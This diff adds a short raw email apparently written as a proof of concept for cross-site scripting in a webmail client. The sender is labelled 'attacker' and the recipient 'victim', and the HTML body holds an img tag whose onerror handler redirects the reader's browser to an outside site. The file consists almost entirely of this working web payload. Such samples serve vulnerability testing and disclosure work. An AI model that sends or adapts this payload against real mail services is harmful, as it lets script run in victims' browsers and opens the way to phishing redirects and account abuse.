@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: alert
+To: victim@189.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img onerror=window.location.href="http://www.wooyun.org" src="http://www.wooyun.org">
